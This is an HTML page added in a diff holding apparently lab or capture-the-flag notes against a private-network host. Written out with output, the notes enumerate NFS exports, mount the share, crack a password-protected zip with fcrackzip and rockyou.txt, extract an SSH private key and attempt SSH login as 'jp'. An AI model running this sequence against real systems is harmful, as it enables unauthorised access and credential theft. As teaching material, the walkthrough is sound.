@@ -1,0 +1,84 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>NFS</title>
+</head><body>Will use a built in command of linux<br/>
+<b>Command : showmount -e 192.168.205.132</b><br/>
+where e is used to list out the directories (i.e. mounted file share)<br/>
+<br/>
+──(root㉿kali)-[/home/kali]<br/>
+└─# showmount -e 192.168.205.132<br/>
+Export list for 192.168.205.132:<br/>
+<b>/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16</b><br/>
+<br/>
+<br/>
+Now will make a directory to mount this file share (i.e. /srv/nfs )<br/>
+will cd to /mnt (i.e. will have a by default directory named mnt )<br/>
+<b>Command : mkdir /mnt/dev</b><br/>
+<b>Command : mount -t nfs 192.168.205.132/srv/nfs /mnt/dev</b><br/>
+where t is tack and nfs is the type <br/>
+<br/>
+┌──(root㉿kali)-[/mnt]<br/>
+└─# mount -t nfs 192.168.205.132:/srv/nfs /mnt/dev<br/>
+                                                               <br/>
+┌──(root㉿kali)-[/mnt]<br/>
+└─# cd dev   <br/>
+                                                               <br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# ls<br/>
+save.zip<br/>
+<br/>
+As a result we got a save.zip file and will unzip it and was able to know that it is password protected.<br/>
+──(root㉿kali)-[/mnt/dev]<br/>
+└─# unzip save.zip<br/>
+Archive: save.zip<br/>
+[save.zip] id_rsa password: <br/>
+password incorrect--reenter: <br/>
+ skipping: id_rsa         incorrect password<br/>
+ skipping: todo.txt        incorrect password<br/>
+<br/>
+Will use a tool to crack this zip called <b>fcrackzip</b><br/>
+(root㉿kali)-[/mnt/dev]<br/>
+└─# apt install fcrackzip <br/>
+<br/>
+Command : fcrackzip -v <br/>
+where -v stands for verbosity to see all the output <br/>
+-u for unzipping it <br/>
+-D means we are going to use a Dictionary attack <br/>
+-p means we are going to use a file <br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip<br/>
+found file 'id_rsa', (size cp/uc  1435/ 1876, flags 9, chk 2a0d)<br/>
+found file 'todo.txt', (size cp/uc  138/  164, flags 9, chk 2aa1)<br/>
+<br/>
+<br/>
+PASSWORD FOUND!!!!:<b>pw == java101</b><br/>
+<br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# unzip save.zip<br/>
+Archive: save.zip<br/>
+[save.zip] id_rsa password: <br/>
+ inflating: id_rsa         <br/>
+ inflating: todo.txt        <br/>
+                                                               <br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# cat todo.txt   <br/>
+- Figure out how to install the main website properly, the config file seems correct...<br/>
+- Update development website<br/>
+- Keep coding in Java because it's awesome<br/>
+<br/>
+jp<br/>
+       <br/>
+As we got a rsa file so will try to connect it via SSH and see what happen's<br/>
+┌──(root㉿kali)-[/mnt/dev]<br/>
+└─# ssh -i id_rsa jp@192.168.205.132<br/>
+The authenticity of host '192.168.205.132 (192.168.205.132)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '192.168.205.132' (ED25519) to the list of known hosts.<br/>
+jp@192.168.205.132's password: <br/>
+Permission denied, please try again.<br/>
+jp@192.168.205.132's password: <br/>
+<br/>
+It was just an hunch cuz we don't even know if these guy is a user or not.      </body></html>
